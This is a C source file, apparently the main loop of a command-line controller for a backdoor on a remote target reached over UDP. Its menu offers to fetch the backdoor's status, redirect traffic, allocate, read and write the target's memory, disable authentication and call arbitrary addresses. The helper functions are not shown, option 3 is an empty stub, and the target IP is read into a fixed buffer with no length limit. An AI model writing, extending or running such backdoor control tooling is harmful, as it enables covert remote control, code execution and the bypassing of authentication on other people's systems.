#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "protocol.h"
#include "control.h"
#include "commun.h"

HOST_ADDR gl_Host_Addr;

int input_host_addr()
{
    printf("[?] Target IP: ");
    scanf("%s", gl_Host_Addr.dest_ip);
    printf("[?] Target Port: ");
    scanf("%d", &gl_Host_Addr.dest_port);
    puts("");

    return 0;
}

int init_soc()
{
    if((gl_Host_Addr.soc = create_udp_socket()) == -1)
    {
        printf("[-] Create socket failed.\n");
        exit(-1);
    }

    gl_Host_Addr.dest_addr = bind_udp_dest_addr(gl_Host_Addr.dest_ip, gl_Host_Addr.dest_port);

    return 0;
}

int display_menu()
{
        printf(\
                "Menu:\n"
                "---------------------------------\n"
                "0.Display menu.\n"
                "1.Fetch status of backdoor.\n"
                "2.Set redirect flow.\n"
                "3.Delete redirct flow.\n"
                "4.Alloc memory.\n"
                "5.Free memory.\n"
                "6.Write to memory.\n"
                "7.Read from memory.\n"
                "8.Disable authentication.\n"
                "9.Enable authentication.\n"
                "A.Call by address.\n"
                "Q.Exit.\n"
                "---------------------------------\n"
               );

               return 0;
}

int main(int argc, char *argv[])
{
    char choose = 0x00;

    if(argc != 3)
    {
        input_host_addr();
    }
    else
    {
        strcat(gl_Host_Addr.dest_ip, argv[1]);
        gl_Host_Addr.dest_port = atoi(argv[2]);
    }
    //strcat(gl_Host_Addr.dest_ip, "192.168.1.1");
    //gl_Host_Addr.dest_port = 9999;
    init_soc();
    display_menu();

    while(1)
    {
        printf("AC> ");
        fflush(stdout);
        clean_stdin();
        choose = getchar();
        if(choose >= 'A' && choose <= 'Z')
            choose = choose - 'A' + 'a';
        switch(choose)
        {
        case '0':
        	display_menu();
        	break;
        case '1':
            fetch_backdoor_status();
            break;
        case '2':
            set_redirect_flow();
            break;
        case '3':
            break;
        case '4':
            alloc_memory();
            break;
        case '5':
            free_memory();
            break;
        case '6':
            write_to_memory();
            break;
        case '7':
            read_from_memory();
            break;
        case '8':
            disable_auth();
            break;
        case '9':
            enable_auth();
            break;
        case 'a':
            call_address();
            break;
        case 'q':
            exit(0);
        case '\n':
            continue;
        default:
            display_menu();
            break;
        }
        puts("");
        fflush(stdout);
    }
    return 0;
}
